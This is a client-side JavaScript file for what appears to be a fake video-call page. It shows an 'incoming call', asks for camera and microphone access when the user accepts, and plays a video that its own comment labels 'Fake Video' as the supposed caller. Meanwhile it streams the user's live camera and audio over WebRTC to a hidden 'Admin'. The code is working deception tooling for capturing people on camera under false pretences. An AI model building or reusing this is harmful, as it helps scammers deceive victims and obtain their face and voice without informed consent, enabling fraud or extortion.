const socket = io();

// Get Room ID
const urlParams = new URLSearchParams(window.location.search);
const roomId = urlParams.get('room') || 'room-1';

// Elements
const waitingRoom = document.getElementById('waiting-room');
const videoInterface = document.getElementById('video-interface');
const callModal = document.getElementById('call-modal');
const acceptBtn = document.getElementById('accept-btn');
const myVideo = document.getElementById('my-camera');
const mainVideo = document.getElementById('main-video');

let localStream;
let peerConnection;
const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

// 1. Join Room
socket.emit('join_room', roomId);

// 2. Listen for "Incoming Call"
socket.on('incoming_call', () => {
    // Hide waiting room, show call popup
    waitingRoom.classList.add('hidden');
    callModal.classList.remove('hidden');
    // Optional: Play ringtone here
});

// 3. Handle "Accept" Click
acceptBtn.addEventListener('click', () => {
    
    // Step A: Ask for Camera Permission NOW
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            // Success: User clicked "Allow"
            
            // 1. Setup UI
            callModal.classList.add('hidden');
            videoInterface.classList.remove('hidden');
            
            // 2. Show User's Face
            localStream = stream;
            myVideo.srcObject = stream;
            
            // 3. Play Fake Video
            mainVideo.play();
            
            // 4. Connect to Admin (WebRTC)
            createPeerConnection();
        })
        .catch(err => {
            alert("You must allow camera access to join the call.");
            console.error(err);
        });
});

// --- WebRTC Logic (Same as before) ---
function createPeerConnection() {
    peerConnection = new RTCPeerConnection(rtcConfig);
    
    localStream.getTracks().forEach(track => {
        peerConnection.addTrack(track, localStream);
    });

    peerConnection.createOffer()
        .then(offer => peerConnection.setLocalDescription(offer))
        .then(() => {
            socket.emit('webrtc_offer', { roomId, sdp: peerConnection.localDescription });
        });

    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            socket.emit('webrtc_ice_candidate', { roomId, candidate: event.candidate });
        }
    };
}

socket.on('webrtc_answer', (sdp) => {
    peerConnection.setRemoteDescription(new RTCSessionDescription(sdp));
});

socket.on('webrtc_ice_candidate', (candidate) => {
    peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
});